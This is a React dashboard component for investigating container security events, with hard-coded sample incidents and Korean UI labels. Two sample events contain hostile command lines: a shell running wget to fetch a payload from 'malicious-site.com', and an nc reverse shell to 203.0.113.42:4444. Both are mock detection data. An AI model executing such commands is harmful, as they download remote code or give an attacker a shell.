import React, { useState } from "react";
import {
  Card,
  Grid,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Paper,
  LinearProgress,
  Box,
  Chip,
  Dialog,
  DialogTitle,
  DialogContent,
  DialogActions,
  TextField,
  Tabs,
  Tab,
  Drawer,
  List,
  ListItem,
  ListItemText,
} from "@mui/material";
import { Line, Pie } from "react-chartjs-2";
import {
  Chart as ChartJS,
  CategoryScale,
  LinearScale,
  PointElement,
  LineElement,
  Title,
  Tooltip,
  Legend,
  ArcElement,
} from "chart.js";
import MDBox from "components/MDBox";
import MDTypography from "components/MDTypography";
import MDButton from "components/MDButton";
import DashboardLayout from "examples/LayoutContainers/DashboardLayout";
import DashboardNavbar from "examples/Navbars/DashboardNavbar";
import Footer from "examples/Footer";

ChartJS.register(
  CategoryScale,
  LinearScale,
  PointElement,
  LineElement,
  Title,
  Tooltip,
  Legend,
  ArcElement
);

// Sample Data
const investigationData = {
  totalEvents: 15,
  criticalEvents: 3,
  containersAffected: 5,
  suspiciousEvents: 7,
  riskyEvents: 5,
  attackEvents: 3,
  timelineEvents: [
    { 
      id: 1, 
      time: "2023-06-15 08:23:14", 
      event: "Unauthorized access attempt", 
      severity: "High", 
      category: "suspicious",
      type: "network",
      details: {
        src_ip: "192.168.1.100",
        dst_ip: "10.0.0.5",
        protocol: "TCP",
        method: "POST",
        args: "/admin/login",
        raw_packet: "45 00 00 3c 1c 46 40 00 40 06 b1 e6 c0 a8 01 64 0a 00 00 05 ...",
      }
    },
    { 
      id: 2, 
      time: "2023-06-15 09:45:32", 
      event: "Unusual file system activity", 
      severity: "Medium", 
      category: "suspicious",
      type: "filesystem",
      details: {
        path: "/etc/passwd",
        operation: "WRITE",
        user: "root",
        process: "/bin/nano",
        md5: "d41d8cd98f00b204e9800998ecf8427e",
      }
    },
    { 
      id: 3, 
      time: "2023-06-15 10:12:07", 
      event: "Network anomaly detected", 
      severity: "High", 
      category: "risky",
      type: "network",
      details: {
        src_ip: "10.0.0.50",
        dst_ip: "203.0.113.0",
        protocol: "UDP",
        port: 53,
        dns_query: "malicious-domain.com",
      }
    },
    { 
      id: 4, 
      time: "2023-06-15 11:30:55", 
      event: "Suspicious system call", 
      severity: "Low", 
      category: "suspicious",
      type: "syscall",
      details: {
        syscall: "execve",
        args: ["/bin/sh", "-c", "wget http://malicious-site.com/payload"],
        pid: 1234,
        uid: 1000,
        gid: 1000,
      }
    },
    { 
      id: 5, 
      time: "2023-06-15 13:17:41", 
      event: "Privilege escalation detected", 
      severity: "Critical", 
      category: "attack",
      type: "memory",
      details: {
        process: "sshd",
        pid: 5678,
        memory_region: "0x7f1234567000",
        size: "4096 bytes",
        content: "41 41 41 41 41 41 41 41 ...",
      }
    },
    { 
      id: 6, 
      time: "2023-06-15 14:05:22", 
      event: "Suspicious outbound connection", 
      severity: "Medium", 
      category: "suspicious",
      type: "network",
      details: {
        src_ip: "10.0.0.10",
        dst_ip: "185.128.40.22",
        protocol: "TCP",
        port: 4444,
        bytes_sent: 1024,
      }
    },
    { 
      id: 7, 
      time: "2023-06-15 15:30:18", 
      event: "Malware signature detected", 
      severity: "High", 
      category: "attack",
      type: "filesystem",
      details: {
        path: "/tmp/suspicious.exe",
        md5: "e1112134227959019c0b52d7ef635f89",
        size: "256KB",
        created_by: "user1",
      }
    },
    { 
      id: 8, 
      time: "2023-06-15 16:45:03", 
      event: "Brute force attack attempt", 
      severity: "Medium", 
      category: "risky",
      type: "network",
      details: {
        src_ip: "203.0.113.42",
        dst_ip: "10.0.0.5",
        protocol: "TCP",
        service: "SSH",
        attempts: 50,
      }
    },
    { 
      id: 9, 
      time: "2023-06-15 17:20:11", 
      event: "Configuration file modified", 
      severity: "Low", 
      category: "suspicious",
      type: "filesystem",
      details: {
        path: "/etc/nginx/nginx.conf",
        user: "www-data",
        process: "/usr/bin/vim",
        changes: "+allow 203.0.113.0/24;",
      }
    },
    { 
      id: 10, 
      time: "2023-06-15 18:05:37", 
      event: "Unusual process spawned", 
      severity: "Medium", 
      category: "suspicious",
      type: "process",
      details: {
        name: "nc",
        arguments: "-e /bin/sh 203.0.113.42 4444",
        ppid: 1000,
        user: "user1",
      }
    },
    { 
      id: 11, 
      time: "2023-06-15 19:12:50", 
      event: "Data exfiltration attempt", 
      severity: "High", 
      category: "risky",
      type: "network",
      details: {
        src_ip: "10.0.0.15",
        dst_ip: "198.51.100.33",
        protocol: "HTTPS",
        bytes_sent: 10485760,
        destination: "unknown-cloud-storage.com",
      }
    },
    { 
      id: 12, 
      time: "2023-06-15 20:30:25", 
      event: "Kernel module loaded", 
      severity: "High", 
      category: "risky",
      type: "system",
      details: {
        module_name: "unknown_module",
        size: "128KB",
        loaded_by: "root",
        md5: "7ae5b1852b34671afc6f7b56bac87788",
      }
    },
    { 
      id: 13, 
      time: "2023-06-15 21:45:19", 
      event: "Firewall rule modified", 
      severity: "Medium", 
      category: "suspicious",
      type: "system",
      details: {
        rule: "ACCEPT INPUT 22/tcp",
        user: "admin",
        source: "203.0.113.0/24",
      }
    },
    { 
      id: 14, 
      time: "2023-06-15 22:55:08", 
      event: "Ransomware activity detected", 
      severity: "Critical", 
      category: "attack",
      type: "filesystem",
      details: {
        affected_files: 1000,
        encryption_extension: ".encrypted",
        ransom_note: "/root/READ_ME.txt",
      }
    },
    { 
      id: 15, 
      time: "2023-06-15 23:30:42", 
      event: "DDoS attack detected", 
      severity: "High", 
      category: "risky",
      type: "network",
      details: {
        target_ip: "10.0.0.5",
        protocol: "UDP",
        pps: 1000000,
        duration: "5 minutes",
      }
    },
  ],
  topContainers: [
    { name: "web-server-01", events: 45, criticalEvents: 3 },
    { name: "database-01", events: 38, criticalEvents: 7 },
    { name: "auth-service", events: 29, criticalEvents: 2 },
    { name: "logging-service", events: 25, criticalEvents: 1 },
  ],
  eventTrend: {
    labels: ["1일전", "2일전", "3일전", "4일전", "5일전", "6일전", "7일전"],
    datasets: [
      {
        label: "이벤트 수",
        data: [15, 23, 18, 34, 20, 28, 30],
        borderColor: "rgb(75, 192, 192)",
        tension: 0.1,
      },
    ],
  },
  eventDistribution: {
    labels: ['의심 이벤트', '위험 이벤트', '공격 이벤트'],
    datasets: [
      {
        data: [7, 5, 3],
        backgroundColor: ['#FFA500', '#FF4500', '#FF0000'],
      },
    ],
  },
};

// Timeline Component
const Timeline = ({ events, onEventClick }) => (
  <Box 
    sx={{ 
      position: 'relative', 
      height: '400px', 
      overflowY: 'auto',
      '&::-webkit-scrollbar': {
        width: '8px',
      },
      '&::-webkit-scrollbar-track': {
        background: '#f1f1f1',
      },
      '&::-webkit-scrollbar-thumb': {
        background: '#888',
        borderRadius: '4px',
      },
      '&::-webkit-scrollbar-thumb:hover': {
        background: '#555',
      },
    }}
  >
    <Box
      sx={{
        '&::before': { 
          content: '""', 
          position: 'absolute', 
          left: '16px', 
          top: 0,
          bottom: 0,
          width: '2px', 
          backgroundColor: 'grey.300',
        } 
      }}
    >
      {events.map((event, index) => (
        <Box key={index} sx={{ display: 'flex', mb: 3, pl: 2, position: 'relative' }}>
          <Box sx={{ 
            width: '32px', 
            height: '32px', 
            borderRadius: '50%', 
            backgroundColor: event.category === 'attack' ? 'error.main' : event.category === 'risky' ? 'warning.main' : 'info.main', 
            display: 'flex', 
            alignItems: 'center', 
            justifyContent: 'center', 
            zIndex: 1,
            flexShrink: 0,
            position: 'absolute',
            left: 0,
          }}>
            <MDTypography variant="body2" color="white">
              {index + 1}
            </MDTypography>
          </Box>
          <Box sx={{ ml: 5, flex: 1 }}>
            <MDTypography variant="body2" fontWeight="bold">
              {event.time}
            </MDTypography>
            <MDTypography variant="body2">
              {event.event}
            </MDTypography>
            <MDTypography variant="caption" color="text.secondary">
              심각도: {event.severity} | 분류: {event.category}
            </MDTypography>
            <MDButton 
              variant="text" 
              color="info" 
              size="small" 
              onClick={() => onEventClick(event)}
              sx={{ mt: 1 }}
            >
              상세 보기
            </MDButton>
          </Box>
        </Box>
      ))}
    </Box>
  </Box>
);

export default function Investigation() {
  const [isGeneratingReport, setIsGeneratingReport] = useState(false);
  const [selectedCategory, setSelectedCategory] = useState(null);
  const [openDialog, setOpenDialog] = useState(false);
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [newTag, setNewTag] = useState("");
  const [tabValue, setTabValue] = useState(0);
  const [drawerOpen, setDrawerOpen] = useState(false);
  const [selectedChartEvents, setSelectedChartEvents] = useState([]);

  const generateReport = () => {
    setIsGeneratingReport(true);
    setTimeout(() => {
      setIsGeneratingReport(false);
      alert("Report generated successfully!");
    }, 3000);
  };

  const handleCategoryClick = (category) => {
    setSelectedCategory(category);
  };

  const handleEventClick = (event) => {
    setSelectedEvent(event);
    setOpenDialog(true);
  };

  const handleCloseDialog = () => {
    setOpenDialog(false);
    setSelectedEvent(null);
    setTabValue(0);
  };

  const handleAddTag = () => {
    if (newTag && selectedEvent) {
      console.log(`Added tag "${newTag}" to event ${selectedEvent.id}`);
      setNewTag("");
    }
  };

  const handleTabChange = (event, newValue) => {
    setTabValue(newValue);
  };

  const handleChartClick = (elements) => {
    if (elements.length > 0) {
      const clickedIndex = elements[0].index;
      let filteredEvents;
      if (elements[0].datasetIndex === 0) { // Event Trend Chart
        const clickedDate = investigationData.eventTrend.labels[clickedIndex];
        filteredEvents = investigationData.timelineEvents.filter(event => 
          event.time.startsWith(clickedDate)
        );
      } else { // Event Distribution Chart
        const clickedCategory = investigationData.eventDistribution.labels[clickedIndex].split(' ')[0].toLowerCase();
        filteredEvents = investigationData.timelineEvents.filter(event => 
          event.category === clickedCategory
        );
      }
      setSelectedChartEvents(filteredEvents);
      setDrawerOpen(true);
    }
  };

  const filteredEvents = selectedCategory
    ? investigationData.timelineEvents.filter(event => event.category === selectedCategory)
    : investigationData.timelineEvents;

  return (
    <DashboardLayout>
      <DashboardNavbar />
      <MDBox py={3}>
        <Grid container spacing={3}>
          {/* Key Metrics */}
          <Grid item xs={12} sm={6} md={3}>
            <Card>
              <MDBox p={2} textAlign="center">
                <MDTypography variant="h5" fontWeight="medium" color="info">
                  {investigationData.totalEvents}
                </MDTypography>
                <MDTypography variant="caption" color="text">
                  총 이벤트 수
                </MDTypography>
              </MDBox>
            </Card>
          </Grid>
          <Grid item xs={12} sm={6} md={3}>
            <Card>
              <MDBox p={2} textAlign="center">
                <MDTypography variant="h5" fontWeight="medium" color="warning">
                  {investigationData.suspiciousEvents}
                </MDTypography>
                <MDTypography variant="caption" color="text">
                  의심 이벤트 수
                </MDTypography>
              </MDBox>
            </Card>
          </Grid>
          <Grid item xs={12} sm={6} md={3}>
            <Card>
              <MDBox p={2} textAlign="center">
                <MDTypography variant="h5" fontWeight="medium" color="error">
                  {investigationData.riskyEvents}
                </MDTypography>
                <MDTypography variant="caption" color="text">
                  위험 이벤트 수
                </MDTypography>
              </MDBox>
            </Card>
          </Grid>
          <Grid item xs={12} sm={6} md={3}>
            <Card>
              <MDBox p={2} textAlign="center">
                <MDTypography variant="h5" fontWeight="medium" color="error">
                  {investigationData.attackEvents}
                </MDTypography>
                <MDTypography variant="caption" color="text">
                  공격 이벤트 수
                </MDTypography>
              </MDBox>
            </Card>
          </Grid>

          {/* Event Classification */}
          <Grid item xs={12}>
            <Card>
              <MDBox p={2}>
                <MDTypography variant="h6" fontWeight="medium" mb={2}>
                  이벤트 분류
                </MDTypography>
                <MDBox display="flex" flexWrap="wrap" justifyContent="space-around" gap={1}>
                  <Chip
                    label={`전체 이벤트 (${investigationData.totalEvents})`}
                    color="default"
                    onClick={() => handleCategoryClick(null)}
                    sx={{ cursor: 'pointer', mb: 1 }}
                  />
                  <Chip
                    label={`의심 이벤트 (${investigationData.suspiciousEvents})`}
                    color="info"
                    onClick={() => handleCategoryClick('suspicious')}
                    sx={{ cursor: 'pointer', mb: 1 }}
                  />
                  <Chip
                    label={`위험 이벤트 (${investigationData.riskyEvents})`}
                    color="warning"
                    onClick={() => handleCategoryClick('risky')}
                    sx={{ cursor: 'pointer', mb: 1 }}
                  />
                  <Chip
                    label={`공격 이벤트 (${investigationData.attackEvents})`}
                    color="error"
                    onClick={() => handleCategoryClick('attack')}
                    sx={{ cursor: 'pointer', mb: 1 }}
                  />
                </MDBox>
              </MDBox>
            </Card>
          </Grid>

          {/* Timeline and Data Analysis */}
          <Grid item xs={12} lg={6}>
            <Card sx={{ height: '100%' }}>
              <MDBox p={2}>
                <MDTypography variant="h6" fontWeight="medium" mb={2}>
                  이벤트 타임라인
                </MDTypography>
                <Timeline events={filteredEvents} onEventClick={handleEventClick} />
              </MDBox>
            </Card>
          </Grid>

          <Grid item xs={12} lg={6}>
            <Card sx={{ height: '100%' }}>
              <MDBox p={2}>
                <MDTypography variant="h6" fontWeight="medium" mb={2}>
                  데이터 분석
                </MDTypography>
                <TableContainer component={Paper}>
                  <Table sx={{ minWidth: 650 }} aria-label="simple table">
                    <TableHead>
                      <TableRow>
                        <TableCell>컨테이너</TableCell>
                        <TableCell align="right">총 이벤트</TableCell>
                        <TableCell align="right">중요 이벤트</TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {investigationData.topContainers.map((container) => (
                        <TableRow key={container.name}>
                          <TableCell component="th" scope="row">
                            {container.name}
                          </TableCell>
                          <TableCell align="right">{container.events}</TableCell>
                          <TableCell align="right">{container.criticalEvents}</TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </TableContainer>
              </MDBox>
            </Card>
          </Grid>

          {/* Event Trend and Distribution Charts */}
          <Grid item xs={12} md={6}>
            <Card sx={{ height: '100%' }}>
              <MDBox p={2}>
                <MDTypography variant="h6" fontWeight="medium" mb={2}>
                  이벤트 트렌드
                </MDTypography>
                <Box sx={{ height: 300 }}>
                  <Line 
                    data={investigationData.eventTrend} 
                    options={{
                      onClick: (event, elements) => handleChartClick(elements),
                      maintainAspectRatio: false,
                    }}
                  />
                </Box>
              </MDBox>
            </Card>
          </Grid>

          <Grid item xs={12} md={6}>
            <Card sx={{ height: '100%' }}>
              <MDBox p={2}>
                <MDTypography variant="h6" fontWeight="medium" mb={2}>
                  이벤트 분포
                </MDTypography>
                <Box sx={{ height: 300 }}>
                  <Pie 
                    data={investigationData.eventDistribution} 
                    options={{
                      onClick: (event, elements) => handleChartClick(elements),
                      maintainAspectRatio: false,
                    }}
                  />
                </Box>
              </MDBox>
            </Card>
          </Grid>

          {/* Report Generation */}
          <Grid item xs={12}>
            <Card>
              <MDBox p={2}>
                <MDTypography variant="h6" fontWeight="medium" mb={2}>
                  리포트 생성
                </MDTypography>
                <MDBox display="flex" justifyContent="space-between" alignItems="center">
                  <MDTypography variant="body2" color="text">
                    현재 조사 데이터를 바탕으로 상세 리포트를 생성합니다.
                  </MDTypography>
                  <MDButton
                    variant="contained"
                    color="info"
                    onClick={generateReport}
                    disabled={isGeneratingReport}
                  >
                    {isGeneratingReport ? "생성 중..." : "리포트 생성"}
                  </MDButton>
                </MDBox>
                {isGeneratingReport && (
                  <LinearProgress sx={{ mt: 2 }} />
                )}
              </MDBox>
            </Card>
          </Grid>
        </Grid>
      </MDBox>
      <Footer />

      {/* Event Detail Dialog */}
      <Dialog open={openDialog} onClose={handleCloseDialog} maxWidth="md" fullWidth>
        <DialogTitle>이벤트 상세 정보</DialogTitle>
        <DialogContent>
          {selectedEvent && (
            <>
              <MDTypography variant="body1">시간: {selectedEvent.time}</MDTypography>
              <MDTypography variant="body1">이벤트: {selectedEvent.event}</MDTypography>
              <MDTypography variant="body1">심각도: {selectedEvent.severity}</MDTypography>
              <MDTypography variant="body1">분류: {selectedEvent.category}</MDTypography>
              <MDTypography variant="body1">유형: {selectedEvent.type}</MDTypography>
              <MDBox mt={2}>
                <Tabs value={tabValue} onChange={handleTabChange}>
                  <Tab label="상세 정보" />
                  <Tab label="원시 데이터" />
                  <Tab label="태그" />
                </Tabs>
                <Box mt={2}>
                  {tabValue === 0 && (
                    <TableContainer component={Paper}>
                      <Table>
                        <TableBody>
                          {Object.entries(selectedEvent.details).map(([key, value]) => (
                            <TableRow key={key}>
                              <TableCell component="th" scope="row">
                                {key}
                              </TableCell>
                              <TableCell>{typeof value === 'object' ? JSON.stringify(value) : value}</TableCell>
                            </TableRow>
                          ))}
                        </TableBody>
                      </Table>
                    </TableContainer>
                  )}
                  {tabValue === 1 && (
                    <Box
                      component="pre"
                      sx={{
                        backgroundColor: 'grey.100',
                        p: 2,
                        borderRadius: 1,
                        overflowX: 'auto',
                      }}
                    >
                      {JSON.stringify(selectedEvent, null, 2)}
                    </Box>
                  )}
                  {tabValue === 2 && (
                    <Box>
                      <TextField
                        label="새 태그 추가"
                        value={newTag}
                        onChange={(e) => setNewTag(e.target.value)}
                        fullWidth
                      />
                      <MDButton onClick={handleAddTag} color="info" sx={{ mt: 2 }}>
                        태그 추가
                      </MDButton>
                    </Box>
                  )}
                </Box>
              </MDBox>
            </>
          )}
        </DialogContent>
        <DialogActions>
          <MDButton onClick={handleCloseDialog} color="secondary">
            닫기
          </MDButton>
        </DialogActions>
      </Dialog>

      {/* Sliding Panel for Chart Events */}
      <Drawer
        anchor="right"
        open={drawerOpen}
        onClose={() => setDrawerOpen(false)}
      >
        <Box sx={{ width: 300, p: 2 }}>
          <MDTypography variant="h6" fontWeight="medium" mb={2}>
            선택된 이벤트
          </MDTypography>
          <List>
            {selectedChartEvents.map((event, index) => (
              <ListItem key={index} button onClick={() => handleEventClick(event)}>
                <ListItemText
                  primary={event.event}
                  secondary={`${event.time} - ${event.severity}`}
                />
              </ListItem>
            ))}
          </List>
        </Box>
      </Drawer>
    </DashboardLayout>
  );
}